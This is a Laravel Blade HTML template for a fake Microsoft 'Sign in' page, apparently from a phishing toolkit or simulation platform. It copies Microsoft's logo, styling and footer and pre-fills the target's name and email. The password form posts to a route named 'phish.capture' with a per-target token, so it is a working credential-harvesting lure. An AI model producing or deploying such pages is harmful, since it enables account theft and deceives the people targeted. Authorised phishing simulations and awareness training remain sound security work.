<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex">
    <title>Sign in to your account</title>
    <link rel="icon" href="https://logincdn.msauth.net/16.000.31130.12/images/favicon.ico">
    <link rel="preconnect" href="https://logincdn.msauth.net">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f2f2f2;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .outer{width:100%;max-width:440px}
        .card{background:#fff;padding:44px;border-radius:0;box-shadow:0 2px 6px rgba(0,0,0,.2);min-height:500px}
        .ms-logo{margin-bottom:16px;height:24px;width:108px}
        .ms-logo svg{width:108px;height:24px}
        h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:16px;line-height:1.3}
        .error-msg{display:none;background:#fde7e9;border:1px solid #c50f1f;padding:12px 16px;margin-bottom:16px;border-radius:2px;font-size:14px;color:#c50f1f}
        .email-row{display:flex;align-items:center;padding:6px 10px 6px 16px;margin-bottom:20px;background:#fff;border:1px solid transparent;border-radius:2px}
        .avatar{width:32px;height:32px;border-radius:50%;background:#0078d4;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:600;margin-right:12px;flex-shrink:0}
        .email-info{flex:1;min-width:0}
        .email-info .name{font-size:14px;font-weight:600;color:#1b1b1b}
        .email-info .addr{font-size:13px;color:#616161;margin-top:1px}
        .change-link{font-size:13px;color:#0067b8;text-decoration:none;font-weight:600;margin-left:auto;padding:4px 8px;border-radius:2px;transition:background .1s}
        .change-link:hover{background:#f3f2f1}
        .form-group{margin-bottom:16px}
        .form-group label{display:block;font-size:14px;color:#424242;margin-bottom:6px;font-weight:600}
        .input-row{position:relative}
        .input-row input{width:100%;height:36px;padding:6px 10px;font-size:15px;font-family:'Segoe UI',sans-serif;border:1px solid #8c8c8c;border-radius:0;outline:none;background:#fff;transition:border-color .1s}
        .input-row input:focus{border-color:#0078d4;border-bottom:2px solid #0078d4}
        .input-row input.error{border-color:#c50f1f}
        .eye-btn{position:absolute;right:8px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;color:#616161;padding:4px;display:flex;align-items:center}
        .eye-btn svg{width:16px;height:16px}
        .pw-label{position:absolute;left:10px;top:-8px;background:#fff;padding:0 4px;font-size:12px;color:#616161;display:none}
        .no-acct{font-size:13px;color:#616161;margin-top:4px}
        .no-acct a{color:#0067b8;text-decoration:none}
        .no-acct a:hover{text-decoration:underline}
        .btn-signin{width:100%;height:32px;background:#0078d4;border:none;color:#fff;font-size:14px;font-weight:600;cursor:pointer;margin-top:24px;transition:background .1s;font-family:'Segoe UI',sans-serif}
        .btn-signin:hover{background:#106ebe}
        .btn-signin:active{background:#005a9e}
        .helpers{margin-top:16px}
        .helpers a{font-size:13px;color:#0067b8;text-decoration:none;display:inline-block;margin-right:16px}
        .helpers a:hover{text-decoration:underline}
        .footer{position:fixed;bottom:0;left:0;right:0;padding:16px 24px;display:flex;justify-content:space-between;align-items:center;font-size:12px;color:#616161;background:#fff;border-top:1px solid #e1e1e1}
        .footer a{color:#616161;text-decoration:none}
        .footer a:hover{text-decoration:underline}
        .footer-links{display:flex;gap:16px;flex-wrap:wrap}
        @media(max-width:480px){.card{padding:24px}}
    </style>
</head>
<body>
    <div class="outer">
        <div class="card">
            <div class="ms-logo">
                <svg viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
                    <g fill="#737373">
                        <path d="M0 0h11.3v11.3H0z" fill="#F25022"/>
                        <path d="M12.7 0H24v11.3H12.7z" fill="#7FBA00"/>
                        <path d="M0 12.7h11.3V24H0z" fill="#00A4EF"/>
                        <path d="M12.7 12.7H24V24H12.7z" fill="#FFB900"/>
                    </g>
                    <text x="30" y="18" font-family="Segoe UI" font-size="16" font-weight="600" fill="#1b1b1b">Microsoft</text>
                </svg>
            </div>

            <h1>Sign in</h1>

            <div class="error-msg" id="errorMsg"></div>

            <div class="email-row">
                <div class="avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
                <div class="email-info">
                    <div class="name">{{ $name }}</div>
                    <div class="addr">{{ $email }}</div>
                </div>
                <a href="#" class="change-link">Use another account</a>
            </div>

            <form action="{{ route('phish.capture', ['provider' => 'microsoft', 'token' => $token]) }}" method="POST" id="loginForm">
                @csrf
                <div class="form-group">
                    <label for="password">Enter password</label>
                    <div class="input-row">
                        <input type="password" id="password" name="password" autocomplete="current-password" required autofocus>
                        <button type="button" class="eye-btn" onclick="togglePass()">
                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                        </button>
                    </div>
                </div>

                <div style="display:flex;align-items:center;margin-bottom:16px">
                    <input type="checkbox" id="keepSigned" style="margin-right:8px;cursor:pointer" checked>
                    <label for="keepSigned" style="font-size:13px;color:#424242;cursor:pointer">Keep me signed in</label>
                </div>

                <button type="submit" class="btn-signin">Sign in</button>
            </form>

            <div class="helpers">
                <a href="#">Forgot password?</a>
                <a href="#">Sign-in options</a>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Terms of use</a>
            <a href="#">Privacy &amp; cookies</a>
        </div>
        <span>© 2026 Microsoft</span>
    </div>

    <script>
        function togglePass() {
            var inp = document.getElementById('password');
            var btn = document.querySelector('.eye-btn');
            if (inp.type === 'password') {
                inp.type = 'text';
                btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17.94 17.94A10.07 10.07 0 0112 20c-7 0-11-8-11-8a18.45 18.45 0 015.06-5.94M9.9 4.24A9.12 9.12 0 0112 4c7 0 11 8 11 8a18.5 18.5 0 01-2.16 3.19m-6.72-1.07a3 3 0 11-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>';
            } else {
                inp.type = 'password';
                btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>';
            }
        }
    </script>
</body>
</html>
